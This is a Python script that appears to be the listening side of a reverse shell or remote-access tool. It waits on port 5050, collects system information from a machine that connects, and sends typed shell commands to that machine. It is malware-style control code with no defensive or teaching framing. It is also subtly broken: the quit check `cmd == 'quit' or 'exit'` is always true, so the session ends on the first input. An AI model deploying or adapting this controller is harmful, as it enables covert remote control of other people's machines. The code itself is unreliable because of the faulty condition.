import socket
import sys
import json

PORT = 5050
HOST = socket.gethostbyname(socket.gethostname())
# HOST = '192.168.43.33'
ADDR = (HOST, PORT)
FORMAT = 'utf-8'

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(ADDR)

# Establishing connection
def connection():
    
    server.listen()
    print(f'[*] Server is listening on {ADDR}')
    conn, address = server.accept()
    print(f'[*] {address[0]} connected on port {address[1]}')

    print("\n ==================== SYSTEM INFO ====================  \n")
    sys_info(conn)

    send_commands(conn)
    conn.close()

def sys_info(conn):
    sysInfo = conn.recv(20480)
    sysInfo = json.loads(sysInfo.decode("utf-8"))

    for key, val in sysInfo.items():
        print(key + ": " + val )

# Sending commands
def send_commands(conn):
    while True:
        cmd = input(" ")
        if cmd == "quit" or "exit":
            conn.close()
            server.close()
            sys.exit()
        if len(str.encode(cmd))>0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    connection()

if __name__ == "__main__":
    main()